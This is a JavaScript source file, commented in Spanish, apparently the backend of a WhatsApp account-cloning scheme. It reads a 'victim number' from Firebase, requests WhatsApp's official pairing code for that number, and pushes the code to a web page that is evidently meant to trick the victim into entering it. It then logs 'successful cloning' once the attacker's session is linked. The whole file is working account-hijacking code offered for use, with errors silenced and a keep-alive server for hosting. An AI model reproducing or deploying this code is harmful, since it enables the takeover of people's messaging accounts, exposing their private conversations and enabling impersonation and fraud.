const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

// Configuración de Firebase Admin
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
}
const db = admin.firestore();

// Inicialización del cliente WhatsApp con Puppeteer corregido para Render
const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master-session" }),
    puppeteer: {
        headless: true,
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox', 
            '--disable-dev-shm-usage', 
            '--single-process'
        ]
    }
});

// Función de vigilancia para detectar números nuevos
async function monitorizar() {
    try {
        const docRef = db.collection("wa_clon_global").doc("current_session");
        const snap = await docRef.get();
        
        if (snap.exists) {
            const data = snap.data();
            // Si el estado es solicitando_codigo y no hay código generado aún
            if (data.status === "solicitando_codigo" && !data.pairingCode) {
                console.log("Procesando numero: " + data.numero_victima);
                
                // Pedir el código oficial de 8 dígitos
                const code = await client.requestPairingCode(data.numero_victima);
                
                console.log("Codigo generado: " + code);
                
                // Actualizar Firebase para que la web lo muestre
                await docRef.update({
                    pairingCode: code,
                    status: "mostrando_codigo"
                });
            }
        }
    } catch (e) {
        // Error silencioso para evitar ruidos en el log
    }
}

// Revisar la base de datos cada 3 segundos
setInterval(monitorizar, 3000);

client.on('ready', () => {
    console.log("CLONACION EXITOSA: Sesion vinculada");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(e => console.log("Error inicializando:", e.message));

// Servidor de salud para que Render mantenga el servicio activo
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.write('MOTOR PAIRING ONLINE');
    res.end();
}).listen(port, () => {
    console.log("Servidor iniciado en puerto " + port);
});
